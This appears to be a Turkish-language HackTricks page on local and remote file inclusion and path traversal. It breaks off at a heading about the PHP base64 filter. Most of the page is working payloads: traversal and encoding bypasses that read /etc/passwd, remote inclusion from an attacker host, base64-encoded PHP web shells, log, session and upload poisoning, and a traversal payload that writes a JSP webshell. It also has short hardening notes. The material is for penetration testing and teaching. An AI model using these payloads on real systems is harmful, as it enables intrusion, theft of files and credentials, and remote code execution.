# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** Dosya uzak bir sunucudan yüklenir (En iyi: Kodu siz yazarsınız ve sunucu onu çalıştırır). php'de bu varsayılan olarak **devre dışı**dır (**allow_url_include**).\
**Local File Inclusion (LFI):** Sunucu yerel bir dosya yükler.

Zafiyet, kullanıcının sunucunun yükleyeceği dosyayı bir şekilde kontrol edebilmesi durumunda ortaya çıkar.

Etkilenen **PHP fonksiyonları**: require, require_once, include, include_once

Bu zafiyeti sömürmek için ilginç bir araç: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE dosyalar
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Birden fazla *nix LFI listesini karıştırıp daha fazla yol ekleyerek bunu oluşturdum:**


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

Ayrıca `/`'i `\` ile değiştirmeyi dene\
Ayrıca `../../../../../` eklemeyi dene

A list that uses several techniques to find the file /etc/password (to check if the vulnerability exists) can be found [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Farklı wordlists birleşimi:


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

Ayrıca `/`'i `\` ile değiştirmeyi dene\
Ayrıca `C:/`'u kaldırıp `../../../../../` eklemeyi dene

A list that uses several techniques to find the file /boot.ini (to check if the vulnerability exists) can be found [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Linux için LFI listesine bakın.

## Temel LFI ve bypass'lar

Tüm örnekler Local File Inclusion içindir ancak Remote File Inclusion için de uygulanabilir (page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)/>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### traversal sequences özyinelemeli olmayan şekilde çıkarıldı
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Bypass: sağlanan dizenin sonuna eklenen ekstra karakterleri atlatır (bypass of: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Bu, **PHP 5.4'ten beri çözüldü**

### **Kodlama**

double URL encode (and others) gibi standart dışı enkodlamalar kullanabilirsiniz:
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Mevcut klasörden

Belki arka uç klasör yolunu kontrol ediyordur:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Sunucuda Dosya Sistemi Dizinlerini Keşfetme

Sunucunun dosya sistemi, yalnızca dosyaları değil dizinleri de belirlemek için belirli teknikler kullanılarak özyinelemeli şekilde keşfedilebilir. Bu süreç, dizin derinliğinin belirlenmesini ve belirli klasörlerin varlığının sorgulanmasını içerir. Aşağıda bunu başarmak için ayrıntılı bir yöntem verilmiştir:

1. **Dizin Derinliğini Belirleyin:** Geçerli dizininizin derinliğini, `/etc/passwd` dosyasını başarıyla alarak belirleyin (sunucu Linux tabanlıysa geçerlidir). Örnek bir URL aşağıdaki gibi yapılandırılabilir; bu üç düzeyli bir derinliği gösterir:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Klasörleri Sorgulayın:** Şüphelenilen klasörün adını (ör. `private`) URL'ye ekleyin, sonra `/etc/passwd`'e geri gidin. Ek dizin seviyesi için derinliği bir artırmanız gerekir:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Sonuçları Yorumlayın:** Sunucunun yanıtı klasörün mevcut olup olmadığını gösterir:
- **Hata / Çıktı Yok:** Belirtilen konumda `private` klasörü muhtemelen mevcut değildir.
- **`/etc/passwd` içeriği:** `private` klasörünün varlığı doğrulanır.
4. **Özyinelemeli Keşif:** Bulunan klasörler aynı teknik veya geleneksel Local File Inclusion (LFI) yöntemleri kullanılarak alt dizinler veya dosyalar için daha fazla araştırılabilir.

Dosya sistemindeki farklı konumlardaki dizinleri keşfetmek için payload'u buna göre ayarlayın. Örneğin, `/var/www/` içinde bir `private` dizini olup olmadığını kontrol etmek için (mevcut dizinin derinliğinin 3 olduğunu varsayarsak), kullanın:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncation, web uygulamalarında dosya yollarını manipüle etmek için kullanılan bir yöntemdir. Genellikle, dosya yollarının sonuna ekstra karakterler ekleyen bazı güvenlik önlemlerini atlayarak kısıtlı dosyalara erişmek için kullanılır. Amaç, güvenlik önlemi tarafından değiştirildiğinde bile hedeflenen dosyaya işaret eden bir dosya yolu oluşturmaktır.

In PHP, dosya sistemi doğası gereği bir dosya yolunun farklı gösterimleri eşdeğer kabul edilebilir. Örneğin:

- /etc/passwd, /etc//passwd, /etc/./passwd ve /etc/passwd/ aynı yol olarak değerlendirilir.
- Son 6 karakter `passwd` ise, sonuna `/` eklemek (yani `passwd/` yapmak) hedeflenen dosyayı değiştirmez.
- Benzer şekilde, bir dosya yoluna `.php` eklendiyse (ör. `shellcode.php`), sonuna `/.` eklemek erişilen dosyayı değiştirmez.

Aşağıdaki örnekler, hassas içeriği (kullanıcı hesap bilgileri) nedeniyle sıkça hedef olan /etc/passwd dosyasına erişmek için path truncation kullanımını gösterir:
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
Bu senaryolarda gerekli traversal sayısı yaklaşık 2027 civarı olabilir, ancak bu sayı sunucunun yapılandırmasına bağlı olarak değişebilir.

- **Using Dot Segments and Additional Characters**: Traversal sequences (`../`) ile ekstra nokta segmentleri ve karakterlerin birleştirilmesi, dosya sisteminde gezinmek için kullanılabilir; bu sayede sunucu tarafından eklenen stringler etkisiz hale getirilebilir.
- **Determining the Required Number of Traversals**: Deneme yanılma ile, kök dizine ve ardından `/etc/passwd`'e ulaşmak için gereken tam `../` dizisinin sayısı bulunabilir; böylece `.php` gibi eklenen stringler nötralize edilirken istenen yol (`/etc/passwd`) korunmuş olur.
- **Starting with a Fake Directory**: Yola var olmayan bir dizinle (ör. `a/`) başlamamak yaygın bir uygulamadır. Bu teknik, önlem amaçlı veya sunucunun path parsing logic gereksinimlerini karşılamak için kullanılır.

When employing path truncation techniques, sunucunun path parsing davranışını ve dosya sistemi yapısını anlamak çok önemlidir. Her senaryo farklı bir yaklaşım gerektirebilir ve en etkili yöntemi bulmak için genellikle test yapmak gerekir.

**This vulnerability was corrected in PHP 5.3.**

### **Filter bypass tricks**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

php'te bu varsayılan olarak devre dışı bırakılmıştır çünkü **`allow_url_include`** **Off.** Çalışması için **On** olması gerekir, ve bu durumda sunucunuzdan bir PHP dosyasını include ederek RCE elde edebilirsiniz:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Eğer herhangi bir nedenle **`allow_url_include`** **On** ise, ancak PHP harici web sayfalarına erişimi filtreliyorsa, [bu gönderiye göre](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), örneğin base64 ile data protokolünü kullanarak b64 PHP kodunu dekode edip RCE elde edebilirsiniz:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> Önceki kodda, son `+.txt` eklendi çünkü attacker'ın `.txt` ile biten bir string'e ihtiyacı vardı; bu yüzden string onunla biter ve b64 decode'dan sonra o kısım sadece çöp döndürecek ve gerçek PHP kodu include edilecek (ve dolayısıyla çalıştırılacak).

Başka bir örnek **`php://` protokolünü kullanmayan** şöyle olur:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python Kök öğesi

Python'da aşağıdaki gibi bir kodda:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Kullanıcı **`file_name`**'e bir **absolute path** gönderirse, **önceki yol sadece kaldırılır**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
Bu, [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join) kaynağına göre amaçlanan bir davranıştır:

> Eğer bir bileşen mutlak bir yol ise, önceki tüm bileşenler atılır ve birleştirme mutlak yol bileşeninden devam eder.

## Java Dizinleri Listeleme

Görünüşe göre Java'da bir Path Traversal varsa ve bir dosya yerine **bir dizin talep ediyorsanız**, **dizin listesi döndürülüyor**. Bu diğer dillerde olmayacaktır (bildiğim kadarıyla).

## En Çok Hedeflenen 25 Parametre

İşte local file inclusion (LFI) zafiyetlerine açık olabilecek en çok 25 parametrenin listesi (from [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI — PHP sarmalayıcıları ve protokoller kullanarak

### php://filter

PHP filtreleri, veriler okunmadan veya yazılmadan önce temel **veri üzerinde değişiklik işlemleri** gerçekleştirmeye izin verir. Filtreler 5 kategoriye ayrılır:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: Verilerden etiketleri kaldırır ( "<" ve ">" karakterleri arasındakiler)
- Not: Bu filtre modern PHP sürümlerinden kaybolmuştur
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : Farklı bir kodlamaya dönüştürür(`convert.iconv.<input_enc>.<output_enc>`). Desteklenen **tüm kodlamaların listesi** için konsolda çalıştırın: `iconv -l`

> [!WARNING]
> `convert.iconv.*` dönüşüm filtresini kötüye kullanarak **keyfi metin** üretebilirsiniz; bu, istediğiniz metni yazmak veya include gibi bir fonksiyonun keyfi metni işlemesini sağlamak için faydalı olabilir. Daha fazla bilgi için bkz. [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: İçeriği sıkıştırır (çok fazla bilgi exfiltrating yaparken kullanışlı)
- `zlib.inflate`: Veriyi açar
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : Kullanımdan kaldırıldı
- `mdecrypt.*` : Kullanımdan kaldırıldı
- Other Filters
- PHP içinde `var_dump(stream_get_filters());` çalıştırırsanız birkaç **beklenmedik filtre** bulabilirsiniz:
- `consumed`
- `dechunk`: HTTP chunked encoding'i tersine çevirir
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> "php://filter" kısmı büyük/küçük harfe duyarsızdır

### Herhangi bir dosyayı okumak için oracle olarak php filters kullanma

[**In this post**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) bir teknik öneriyor: sunucudan çıktı alınmadan yerel bir dosya okumak. Bu teknik oracle olarak **boolean exfiltration of the file (char by char) using php filters**'a dayanır. Bunun nedeni, php filters'ın bir metni php'nin bir hata fırlatacağı kadar büyütebilmesidir.

Orijinal yazıda tekniğin detaylı açıklaması bulunmakla birlikte, kısa bir özet:

- Use the codec **`UCS-4LE`** to leave leading character of the text at the begging and make the size of string increases exponentially.
- Bu, **ilk harfi doğru tahmin ettiğimizde o kadar büyük bir metin** oluşturmak için kullanılacak ki php bir **hata** tetikleyecek.
- The **dechunk** filter will **remove everything if the first char is not an hexadecimal**, so we can know if the first char is hex.
- Bu, öncekiyle (ve tahmin edilen harfe bağlı diğer filtrelerle) birleştiğinde, metnin başındaki bir harfi; yeterince dönüşüm uyguladığımızda artık hexadecimal bir karakter olmadığını görerek tahmin etmemizi sağlar. Çünkü eğer hex ise, dechunk onu silmez ve başlangıçtaki bombanın etkisiyle php hatası tetiklenir.
- The codec **convert.iconv.UNICODE.CP930** transforms every letter in the following one (so after this codec: a -> b). This allow us to discovered if the first letter is an `a` for example because if we apply 6 of this codec a->b->c->d->e->f->g the letter isn't anymore a hexadecimal character, therefore dechunk doesn't deleted it and the php error is triggered because it multiplies with the initial bomb.
- Using other transformations like **rot13** at the beginning it’s possible to leak other chars like n, o, p, q, r (and other codecs can be used to move other letters to the hex range).
- When the initial char is a number it’s needed to base64 encode it and leak the 2 first letters to leak the number.
- The final problem is to see **how to leak more than the initial letter**. By using order memory filters like **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** is possible to change the order of the chars and get in the first position other letters of the text.
- And in order to be able to obtain **further data** the idea if to **generate 2 bytes of junk data at the beginning** with **convert.iconv.UTF16.UTF16**, apply **UCS-4LE** to make it **pivot with the next 2 bytes**, and d**elete the data until the junk data** (this will remove the first 2 bytes of the initial text). Continue doing this until you reach the disired bit to leak.

In the post a tool to perform this automatically was also leaked: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

This wrapper allows to access file descriptors that the process has open. Potentially useful to exfiltrate the content of opened files:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
You can also use **php://stdin, php://stdout and php://stderr** to access the **file descriptors 0, 1 and 2** respectively (bunun bir saldırıda nasıl işe yarayabileceğini bilmiyorum)

### zip:// and rar://

İçine bir PHPShell konulmuş bir Zip veya Rar dosyası yükleyin ve ona erişin.\
rar protocolünü kötüye kullanabilmek için **özellikle etkinleştirilmiş olması gerekir**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Bu protokolün php yapılandırmaları **`allow_url_open`** ve **`allow_url_include`** tarafından kısıtlandığını unutmayın

### expect://

Expect'in etkinleştirilmiş olması gerekir. Bunu kullanarak kod çalıştırabilirsiniz:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

POST parametrelerinde payload'unuzu belirtin:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

Bir `.phar` dosyası, bir web uygulaması dosya yükleme için `include` gibi fonksiyonları kullandığında PHP kodu çalıştırmak için kullanılabilir. Aşağıdaki PHP kod parçası bir `.phar` dosyasının oluşturulmasını göstermektedir:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
`.phar` dosyasını derlemek için aşağıdaki komut çalıştırılmalıdır:
```bash
php --define phar.readonly=0 create_path.php
```
Çalıştırıldığında `test.phar` adlı bir dosya oluşturulacak; bu dosya potansiyel olarak Local File Inclusion (LFI) zafiyetlerini sömürmek için kullanılabilir.

LFI sadece içindeki PHP kodunu çalıştırmadan dosya okuma yapıyorsa — örneğin `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()` veya `filesize()` gibi fonksiyonlar aracılığıyla — bir deserialization vulnerability'nin sömürülmesi denenebilir. Bu zafiyet, `phar` protokolü kullanılarak dosya okunmasıyla ilişkilidir.

For a detailed understanding of exploiting deserialization vulnerabilities in the context of `.phar` files, refer to the document linked below:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

It was possible to abuse **any arbitrary file read from PHP that supports php filters** to get a RCE. The detailed description can be [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**  
Çok kısa özet: PHP heap'inde bir **3 byte overflow** kullanılarak belirli bir boyuttaki boş chunk zinciri **değiştirildi** ve böylece **herhangi bir adrese herhangi bir şeyi yazmak** mümkün oldu; bu nedenle `system` çağırmak için bir hook eklendi. Daha fazla php filters suistimal edilerek belirli boyutlarda chunk'lar alloc etmek mümkün oldu.

### More protocols

Dahil edilebilecek daha fazla [ **protocols to include here**](https://www.php.net/manual/en/wrappers.php) için bakın:

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Belleğe veya geçici bir dosyaya yazma (file inclusion attack'ta bunun nasıl faydalı olabileceği kesin değil)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — Yerel dosya sistemine erişim
- [http://](https://www.php.net/manual/en/wrappers.http.php) — HTTP(s) URL'lerine erişim
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — FTP(s) URL'lerine erişim
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Compression Streams
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Desene uyan yol adlarını bulma (Yazdırılabilir hiçbir şey döndürmediği için burada pek yararlı değil)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Ses akışları (Rastgele dosyaları okumak için kullanışlı değil)

## LFI via PHP's 'assert'

Local File Inclusion (LFI) riskleri, string içindeki kodu çalıştırabilen 'assert' fonksiyonuyla uğraşırken PHP'de özellikle yüksektir. Bu durum, ".." gibi dizin atlama karakterleri içeren girdiler kontrol edilip düzgün şekilde temizlenmiyorsa özellikle problemlidir.

For example, PHP code might be designed to prevent directory traversal like so:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Bu, traversal'ı engellemeyi amaçlarken istemeden code injection için bir vektör oluşturur. Dosya içeriğini okumak için bunu istismar eden bir saldırgan şunu kullanabilir:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Benzer şekilde, rastgele sistem komutları çalıştırmak için şunu kullanabilirsiniz:
```plaintext
' and die(system("id")) or '
```
Bu **payloads**'ı **URL-encode** etmek önemlidir.

## PHP Blind Path Traversal

> [!WARNING]
> Bu teknik, bir **PHP function**'ın **file path**'ini **kontrol ettiğiniz**, bu fonksiyonun bir dosyaya **erişecek** olduğu ama dosya içeriğini görmediğiniz durumlarla ilgilidir (ör. basit bir çağrı **`file()`**) ve içerik gösterilmiyorsa geçerlidir.

In [**this incredible post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) it's explained how a blind path traversal can be abused via PHP filter to **exfiltrate the content of a file via an error oracle**.

Özetle, teknik bir dosyanın içeriğini o kadar büyük yapmak için **"UCS-4LE" encoding** kullanır ki dosyayı açan **PHP function** bir **error** tetikler.

Daha sonra, ilk karakteri leak etmek için filter `dechunk` base64 veya rot13 gibi diğerleriyle birlikte kullanılır ve son olarak filtreler `convert.iconv.UCS-4.UCS-4LE` ve `convert.iconv.UTF16.UTF-16BE` başa başka karakterler yerleştirmek ve onları leak etmek için kullanılır.

**Zafiyetli olabilecek fonksiyonlar**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Teknik detaylar için bahsedilen yazıya bakın!

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

Sunucu tarafı kodu, yüklenen/işlenen dosyaların hedef yolunu kullanıcı kontrollü veriyi (ör. bir filename veya URL) canonicalise ve validate etmeden oluşturuyorsa, `..` segmentleri ve absolute path'ler amaçlanan dizinden kaçabilir ve arbitrary file write'e neden olabilir. Eğer payload'u web'e açık bir dizine yerleştirebiliyorsanız, genellikle bir webshell bırakarak yetkisiz RCE elde edersiniz.

Typical exploitation workflow:
- Bir endpoint veya background worker içinde path/filename kabul eden ve içeriği diske yazan bir write primitive tespit edin (ör. message-driven ingestion, XML/JSON command handlers, ZIP extractors, vb.).
- Web'e açık dizinleri belirleyin. Yaygın örnekler:
- Apache/PHP: `/var/www/html/`
- Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
- IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- Hedef depolama dizininden webroot'a çıkan bir traversal path oluşturun ve webshell içeriğinizi ekleyin.
- Bıraktığınız payload'a gidin ve komutları çalıştırın.

Notlar:
- Yazmayı yapan vulnerable servis non-HTTP portunda dinliyor olabilir (ör. TCP 4004'te bir JMF XML listener). Ana web portalı (farklı port) daha sonra payload'unuzu serve edecektir.
- Java yığınlarında bu dosya yazımları genellikle basit `File`/`Paths` birleştirmesiyle uygulanır. Canonicalisation/allow-listing eksikliği temel zafiyettir.

Generic XML/JMF-style example (product schemas vary – the DOCTYPE/body wrapper is irrelevant for the traversal):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
Bu sınıf hataları önleyen hardening:
- Yolu kanonik bir path'e çözümleyin ve bunun allow-listed base directory'nin bir alt dizini olduğunu zorunlu kılın.
- `..`, mutlak kökler veya sürücü harfleri içeren tüm yolları reddedin; tercihen üretilmiş dosya adlarını kullanın.
- Yazma işlemini düşük ayrıcalıklı bir hesap olarak çalıştırın ve yazma dizinlerini servis edilen köklerden ayırın.

## Remote File Inclusion

Önceden açıklandı, [**follow this link**](#remote-file-inclusion).

### Apache/Nginx log dosyası üzerinden

Eğer Apache veya Nginx sunucusu include fonksiyonu içinde **vulnerable to LFI** ise, **`/var/log/apache2/access.log` or `/var/log/nginx/access.log`** dosyalarına erişmeyi deneyebilir, **user agent** içine veya bir **GET parameter** içine **`<?php system($_GET['c']); ?>`** gibi bir php shell yerleştirip bu dosyayı include edebilirsiniz

> [!WARNING]
> Not: **eğer shell için çift tırnak kullanırsanız** tek tırnaklar yerine, çift tırnaklar "_**quote;**_" stringine dönüştürülecek, **PHP burada bir hata fırlatacak** ve **başka hiçbir şey çalıştırılmayacak**.
>
> Ayrıca, payload'u **doğru yazdığınızdan** emin olun; aksi halde PHP log dosyasını her yüklemeye çalıştığında hata verir ve ikinci bir şansınız olmaz.

Bu işlem diğer loglarda da yapılabilir ancak **dikkat,** log içindeki kod URL encoded olabilir ve bu Shell'i bozabilir. Başlık **authorisation "basic"** Base64 olarak "user:password" içerir ve loglarda decode edilir. PHPShell bu başlığın içine yerleştirilebilir.\
Diğer olası log yolları:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### E-posta ile

**Bir e-posta gönderin** internal bir hesaba (user@localhost) PHP payload'unuzu içerecek şekilde, örneğin `<?php echo system($_REQUEST["cmd"]); ?>` ve kullanıcının mailini şu yollardan biriyle include etmeyi deneyin: **`/var/mail/<USERNAME>`** veya **`/var/spool/mail/<USERNAME>`**

### /proc/\*/fd/\* üzerinden

1. Çok sayıda shell yükleyin (örneğin: 100)  
2. [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD) adresini include edin; burada $PID = sürecin PID'i (brute forced ile bulunabilir) ve $FD dosya tanımlayıcısıdır (o da brute forced ile bulunabilir)

### /proc/self/environ ile

Bir log dosyası gibi, payload'u User-Agent içinde gönderin; /proc/self/environ dosyası içinde yansıtılacaktır.
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Yükleme ile

Eğer bir dosya yükleyebiliyorsanız, içeriğine shell payload enjekte edin (ör. : `<?php system($_GET['c']); ?>` ).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Dosyanın okunabilirliğini korumak için resimlerin/doc/pdf'lerin meta verilerine enjekte etmek en iyisidir

### Zip dosya yüklemesi ile

Sıkıştırılmış bir PHP shell içeren bir ZIP dosyası yükleyin ve erişin:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### PHP sessions aracılığıyla

Web sitesinin PHP Session (PHPSESSID) kullanıp kullanmadığını kontrol edin
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
PHP'de bu sessions _/var/lib/php5/sess\\_\[PHPSESSID]\_ dosyalarına kaydedilir
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Cookie'yi şu değere ayarla: `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
PHP oturum dosyasını dahil etmek için LFI'yi kullanın.
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### ssh ile

Eğer ssh aktifse hangi kullanıcının kullanıldığını kontrol et (/proc/self/status & /etc/passwd) ve **\<HOME>/.ssh/id_rsa** dosyasına erişmeye çalış.

### **Üzerinden** **vsftpd** _**günlükleri**_

FTP sunucusu vsftpd için loglar _**/var/log/vsftpd.log**_ konumundadır. Local File Inclusion (LFI) zafiyeti varsa ve açığa çıkmış bir vsftpd sunucusuna erişim mümkünse, aşağıdaki adımlar düşünülebilir:

1. Login process sırasında username alanına bir PHP payload enjekte et.
2. Enjeksiyondan sonra, LFI'yi kullanarak sunucu loglarını _**/var/log/vsftpd.log**_ adresinden al.

### php base64 filtresi ile (base64 kullanarak)

